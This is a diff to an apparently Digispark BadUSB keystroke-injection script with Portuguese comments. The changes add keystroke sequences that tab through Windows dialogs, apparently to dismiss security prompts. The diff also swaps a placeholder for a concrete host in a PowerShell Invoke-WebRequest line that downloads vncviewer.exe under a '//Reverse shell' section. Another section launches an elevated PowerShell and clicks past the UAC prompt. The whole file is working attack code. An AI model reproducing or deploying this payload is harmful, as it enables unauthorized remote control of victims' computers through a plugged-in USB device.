@@ -25,7 +25,21 @@ pisca_led(100);
   DigiKeyboard.print("\t\t");  //2 TAB
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t\t\t\t"); //4 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t\t\t\t"); //4 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("\t\t");  //2 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
   DigiKeyboard.delay(5000);
   //Reverse shell
@@ -37,7 +51,7 @@ pisca_led(100);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Invoke-WebRequest -Uri http://YOURIP/vncviewer.exe -OutFile vncviewer.exe");
+  DigiKeyboard.println("Invoke-WebRequest -Uri http://192.168.0.192/vncviewer.exe -OutFile vncviewer.exe");
   DigiKeyboard.delay(700);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(12000);
@@ -52,7 +66,7 @@ pisca_led(100);
   DigiKeyboard.println("powershell start-process powershell -verb runas");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("\t\t");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
